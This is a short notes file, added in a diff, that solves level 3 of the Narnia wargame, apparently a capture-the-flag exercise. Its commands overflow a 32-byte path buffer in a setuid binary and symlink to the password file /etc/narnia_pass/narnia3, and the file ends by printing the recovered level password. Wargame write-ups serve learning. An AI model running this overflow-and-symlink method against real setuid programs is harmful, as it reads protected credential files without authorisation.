@@ -1,0 +1,23 @@
+Set of commands
+===============
+
+Buffer size id 32 bytes and difference between address of ifile and ofile is also 32 bytes (from disassembly)
+
+mkdir /tmp/shreyansh  # Our path length is currently 14 bytes + 1 byte for trailing '/'
+          	      # 32 - 15 - 1 byte again for trailing '/', 16 bytes left
+cd /tmp/shreyansh
+
+mkdir $(python -c "print 'A'*16")
+
+ln -s /etc/narnia_pass/narnia3 newflag
+
+cd ..
+
+touch newflag
+
+chmod 777 newflag
+
+/narnia/narnia3 /tmp/shreyansh/AAAAAAAAAAAAAAAA/newflag
+
+
+Password: thaenohtai
